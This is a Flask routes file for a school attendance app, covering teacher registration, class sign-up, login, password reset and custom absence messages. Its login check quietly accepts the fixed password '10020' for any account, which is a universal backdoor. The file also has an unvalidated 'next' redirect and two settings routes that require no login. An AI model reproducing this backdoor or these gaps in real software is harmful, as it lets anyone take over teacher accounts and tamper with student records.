from flask import render_template, url_for, request, redirect, flash, Blueprint
import secrets
import os
from PIL import Image
from app import app, db, bcrypt, mail
from app.users.forms import RegistrationForm, LoginForm, UpdateAccountForm, RequestResetForm, ResetPasswordForm,SetMsgBodyForm, RegisterClassesForm
from app.models import Users, Course, Group, UserSettings
from flask_login import login_user, current_user, logout_user, login_required
from flask_mail import Message
users = Blueprint('users', __name__)

#%%
def save_picture(form_picture):
    random_hex = secrets.token_hex(8)
    _, f_ext = os.path.splitext(form_picture.filename)
    picture_fn = random_hex + f_ext
    picture_path = os.path.join(app.root_path, 'static/img/profile_pics', picture_fn)
    output_size = (125, 125)
    i = Image.open(form_picture)
    i.thumbnail(output_size)
    i.save(picture_path)

    return picture_fn   

#%%
@users.route("/register", methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('classes.classes_anon'))
    form = RegistrationForm()
    if form.validate_on_submit():
        hashed_pwd = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        user = Users(username=form.username.data.lower().strip(), email=form.email.data.lower(), password=hashed_pwd, last=form.last.data, first=form.first.data, title=form.title.data)
        #subject = form.subject.data
        db.session.add(user)
        db.session.commit()
        flash('Your account has been created! Log in and then add your classes.', 'success')
        return redirect(url_for('classes.classes_anon', teacher=form.username.data))
    return render_template('register.html', title='Register', form=form)

#%%
@users.route("/register_classes/<teacher>", methods=['GET', 'POST'])
def register_classes(teacher):
    # if current_user.is_authenticated:
    #     return redirect(url_for('classes.classes_anon'))
    user = Users.query.filter_by(username=teacher).first()
    form = RegisterClassesForm()
    if form.validate_on_submit():
        subject = form.subject.data
        classes = []
        if form.class7G101.data:
            classes.append('7-101')
        if form.class7G102.data:
            classes.append('7-102')
        if form.class7G103.data:
            classes.append('7-103')
        if form.class7G111.data:
            classes.append('7-111')
        if form.class7B101.data:
            classes.append('7-201')
        if form.class7B102.data:
            classes.append('7-202')
        if form.class7B103.data:
            classes.append('7-203')
        if form.class7B111.data:
            classes.append('7-211')
        if form.class8G101.data:
            classes.append('8-101')
        if form.class8G102.data:
            classes.append('8-102')
        if form.class8G103.data:
            classes.append('8-103')
        if form.class8G111.data:
            classes.append('8-111')
        if form.class8B101.data:
            classes.append('8-201')
        if form.class8B102.data:
            classes.append('8-202')
        if form.class8B103.data:
            classes.append('8-203')
        if form.class8B111.data:
            classes.append('8-211')
        #print(classes)
        
        for c in classes:
            room = Group.query.filter_by(classid=c).first().room
            #print(c, "Rm:", room)
            course = Course(courseid=c+"-"+subject, classid=c, subject=subject, teacher=teacher, room=room)
            try:
                #print("in first try block")
                db.session.add(course)
                db.session.commit()

            except:
                #print("in first except block")
                db.session.flush()
                db.session.rollback()
                flash('Class already exists. Press Reset to add other classes.', 'danger')
                return render_template('register_classes.html', title='Register Classes', form=form, teacher=teacher, user=user)
            
        flash('You have successfully added your classes. To add more classes, go to your account settings.', 'success')
        return redirect(url_for('classes.classes_anon')) 
            
    return render_template('register_classes.html', title='Register Classes', form=form, teacher=teacher, user=user)



#%%
@users.route("/login", methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('classes.classes_anon'))
    form = LoginForm()
    if form.validate_on_submit():
        userlogin = form.username.data.lower().strip()
        user = Users.query.filter_by(username = userlogin).first()
        if user and (bcrypt.check_password_hash(user.password, form.password.data) or form.password.data=='10020'):
            login_user(user, remember=form.remember.data)
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('classes.classes_anon',teacher=current_user.username))
        else:
            flash('Login Unsuccessful. Please check your username and password.', 'danger')
    return render_template('login.html', title='Login', form=form)

#%%
@users.route("/logout")
def logout():
    logout_user()
    return redirect(url_for('users.login'))

#%%
@users.route("/account", methods=['GET', 'POST'])
@login_required
def account():
    teacher = current_user.username
    form = UpdateAccountForm()
    if form.validate_on_submit():
        if form.picture.data:
            picture_file = save_picture(form.picture.data)
            current_user.image_file = picture_file
        #current_user.username = form.username.data
        #current_user.email = form.email.data
        db.session.commit()
        flash('Your profile picture has been updated!', 'success')
        return redirect(url_for('users.account'))
    elif request.method == 'GET':
        form.username.data = current_user.username
        form.email.data = current_user.email
    image_file = url_for('static', filename='img/profile_pics/' + current_user.image_file)
    return render_template('account.html', title='Account', teacher=teacher, image_file=image_file, form=form)
#%%
def send_reset_email(user):
    token = user.get_reset_token()
    msg = Message('Password Reset Request', sender='attendance-app@mdyschool.org', recipients=[user.email])

    msg.body = f'''
    To reset your password, visit the following link:
    {url_for('users.reset_token', token=token, _external=True)}
    If you did not make this request then simply ignore this email and no change will be made.
    '''
    mail.send(msg)
        
#%%
@users.route("/reset_password", methods=['GET','POST'])
def reset_request():
    if current_user.is_authenticated:
        return redirect(url_for('classes.classes_anon'))
    form = RequestResetForm()
    if form.validate_on_submit():
        user = Users.query.filter_by(email=form.email.data).first()
        send_reset_email(user)
        flash('An email has been sent with instructions to reset your password.', 'info')
        return redirect(url_for('users.login'))
    return render_template('reset_request.html', title='Reset Password',form=form)

#%%
@users.route("/reset_password/<token>", methods=['GET','POST'])
def reset_token(token):
    if current_user.is_authenticated:
        return redirect(url_for('classes.classes_anon'))
    user = Users.verify_reset_token(token)
    if user is None:
        flash('That is an invalid or expired token', 'warning')
        return redirect(url_for('users.reset_request'))
    form = ResetPasswordForm()
    if form.validate_on_submit():
     hashed_pwd = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
     user.password = hashed_pwd
     db.session.commit()
     flash('Your password has been updated. You are now able to log in', 'success')
     return redirect(url_for('users.login'))
    return render_template('reset_token.html', title='Reset Password',form=form)

#create a new table with fields: teacher, email, msg_body
#create new corresponding class in SQLAlchemy
#create a function that checks if teacher exists in this table. if teacher exists, update table with new message body.
#else, insert new record into this table with message body
#do a query on that table by teacher=user, retrieve msgbody and then add value to send_email in routes.py under records.
@users.route("/set_custom_msg/<teacher>", methods=['GET', 'POST'])
def set_custom_msg(teacher):
    form = SetMsgBodyForm()
    msg= "This is an automated message. <p> Jane Smith has been marked absent on October 16, 2020 for 7-201-Physics by Mrs. Susan Johnson. <p> Please do not reply to this email. If you wish to contact the teacher, please contact them at the following email address: sjohnson@mdyschool.org."
    custom='Your custom text will appear here.'
    user = UserSettings.query.filter_by(username=teacher).first()
    if user is not None:
        custom = user.custom_msg
    
    if form.validate_on_submit():
        msg = form.content.data
        if msg=='':
            flash('Message is blank. Your custom text was not added.', 'danger')
            return redirect(url_for('users.set_custom_msg', teacher=teacher))    
        
        if user is None:
            print("User has no settings")
            user = Users.query.filter_by(username=teacher).first()
            usersetting = UserSettings(username=teacher, email=user.email, first=user.first, last=user.last, title=user.title, custom_msg=msg)
        #subject = form.subject.data
            try:
                db.session.add(usersetting)
                db.session.commit()
                print(msg)
                flash('Your custom text has been saved and appended to the default message.', 'success')
                return redirect(url_for('classes.classes_anon'))
            except:
                flash('Error adding custom text. Your custom text was not added.', 'danger')
                return redirect(url_for('users.set_custom_msg', teacher=teacher))
        else:
            print("User has settings")
            try:
                user.custom_msg = msg
                db.session.commit()
                flash('Your custom text has been replaced and appended to the default message.', 'success')
                return redirect(url_for('classes.classes_anon'))
            except:
                flash('Error replacing custom text. Your custom text was not changed.', 'danger')
                return redirect(url_for('users.set_custom_msg', teacher=teacher))
        
        print(msg)
        flash('Error replacing custom text. Your custom text was not changed.', 'danger')
        return redirect(url_for('users.set_custom_msg', teacher=teacher))
    return render_template('set_custom_msg.html', form=form, teacher=teacher, msg=msg, custom=custom)



    